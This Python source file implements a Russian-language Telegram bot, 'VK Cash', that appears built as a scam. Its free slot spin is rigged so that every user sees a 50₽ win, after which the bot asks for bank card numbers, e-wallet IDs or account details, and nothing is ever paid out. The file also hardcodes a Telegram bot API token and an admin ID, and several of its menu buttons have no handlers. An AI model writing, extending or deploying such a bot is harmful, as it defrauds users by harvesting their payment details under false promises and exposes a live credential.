import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request
import re
import time
import random
import json
import os

API_TOKEN = '8135081615:AAFHaG7cgRaNlBAAEk_ALEP0-wHYzOniYbU'
ADMIN_ID = 6180147473

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)
user_states = {}
first_spin_done = {}

CODES_FILE = "codes.json"
VKCOIN_FILE = "vkcoins.json"

if not os.path.exists(CODES_FILE):
    with open(CODES_FILE, "w") as f:
        json.dump({}, f)
if not os.path.exists(VKCOIN_FILE):
    with open(VKCOIN_FILE, "w") as f:
        json.dump({}, f)

def generate_code(amount, user_id):
    timestamp = int(time.time() * 1000)
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=4))
    code = f"CODE-{amount}-{timestamp}-{random_part}"
    with open(CODES_FILE, "r") as f:
        codes = json.load(f)
    codes[code] = {
        "user_id": user_id,
        "amount": amount,
        "used": False
    }
    with open(CODES_FILE, "w") as f:
        json.dump(codes, f, indent=4)
    return code

def add_vkcoins(user_id, amount):
    with open(VKCOIN_FILE, "r") as f:
        coins = json.load(f)
    coins[str(user_id)] = coins.get(str(user_id), 0) + amount
    with open(VKCOIN_FILE, "w") as f:
        json.dump(coins, f, indent=4)

def get_leaderboard(top_n=5):
    with open(CODES_FILE, "r") as f:
        codes = json.load(f)
    stats = {}
    for code, data in codes.items():
        if data["used"]:
            uid = data["user_id"]
            stats[uid] = stats.get(uid, 0) + data["amount"]
    sorted_stats = sorted(stats.items(), key=lambda x: x[1], reverse=True)
    return sorted_stats[:top_n]

def get_main_markup(user_id):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🎁 Крутить бесплатно", callback_data="free_spin"))
    markup.add(InlineKeyboardButton("🛒 Магазин", callback_data="shop"),
               InlineKeyboardButton("🏆 Топ", callback_data="leaderboard"))
    markup.add(InlineKeyboardButton("📜 Правила", callback_data="rules"),
               InlineKeyboardButton("❓ FAQ", callback_data="faq"))
    markup.add(InlineKeyboardButton("📋 Политика", callback_data="policy"))
    if user_id == ADMIN_ID:
        markup.add(InlineKeyboardButton("👑 Админ-панель", callback_data="admin"))
    return markup

@bot.message_handler(commands=['start'])
def send_start(message):
    bot.send_message(message.chat.id, "🎰 Добро пожаловать в VK Cash!\nВыбирай действие ниже:", reply_markup=get_main_markup(message.from_user.id))

@bot.callback_query_handler(func=lambda call: call.data == "free_spin")
def handle_spin(call):
    uid = call.from_user.id
    if first_spin_done.get(uid):
        bot.answer_callback_query(call.id, "Бесплатная попытка уже использована.")
        return

    first_spin_done[uid] = True
    amount = 50

    msg = bot.send_message(call.message.chat.id, "🔄 Крутим колесо...\n[ 🎰 🎰 🎰 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍋 🍒 💣 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍉 💰 💣 ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ 🍀 💰 🍒 ]")

    code = generate_code(amount, uid)
    user_states[uid] = {"amount": amount, "code": code}
    message_text = f"🎉 *ПОБЕДА {amount}₽!* 🎉\n🎫 Код: `{code}`\n\n💳 Отправьте свои реквизиты:\n— Номер карты (Сбербанк, Тинькофф)\n— Или кошелёк (ЮMoney, Payeer, PayPal)\n— Или банк + номер счёта"
    bot.send_message(call.message.chat.id, message_text, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "shop")
def open_shop(call):
    with open(VKCOIN_FILE, "r") as f:
        coins = json.load(f)
    user_coins = coins.get(str(call.from_user.id), 0)
    markup = InlineKeyboardMarkup()
    if user_coins >= 10:
        markup.add(InlineKeyboardButton("🎰 Повторная попытка (10 VKC)", callback_data="buy_retry"))
    bot.send_message(call.message.chat.id, f"🛒 Магазин VK Coins:\nУ тебя {user_coins} VKC", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "buy_retry")
def buy_retry(call):
    uid = call.from_user.id
    with open(VKCOIN_FILE, "r") as f:
        coins = json.load(f)
    if coins.get(str(uid), 0) >= 10:
        coins[str(uid)] -= 10
        first_spin_done[uid] = False
        with open(VKCOIN_FILE, "w") as f:
            json.dump(coins, f, indent=4)
        bot.send_message(uid, "✅ Повторная попытка активирована! Крути снова.")
    else:
        bot.send_message(uid, "❌ Недостаточно VK Coins.")

@bot.callback_query_handler(func=lambda call: call.data == "leaderboard")
def leaderboard(call):
    top = get_leaderboard()
    text = "🏆 Топ участников по выигрышам:\n"
    for i, (uid, amount) in enumerate(top, 1):
        text += f"{i}. ID {uid} — {amount}₽\n"
    bot.send_message(call.message.chat.id, text)

@bot.callback_query_handler(func=lambda call: call.data == "admin")
def show_admin_panel(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Нет доступа.")
        return
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("📦 Список кодов", callback_data="admin_codes"))
    markup.add(InlineKeyboardButton("💾 Скачать codes.json", callback_data="admin_download"))
    markup.add(InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"))
    bot.send_message(call.message.chat.id, "👑 Админ-панель:", reply_markup=markup)

@app.route('/', methods=['GET', 'POST'])
def webhook():
    if request.method == 'POST':
        update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
        bot.process_new_updates([update])
        return 'OK', 200
    return 'Bot is running!', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
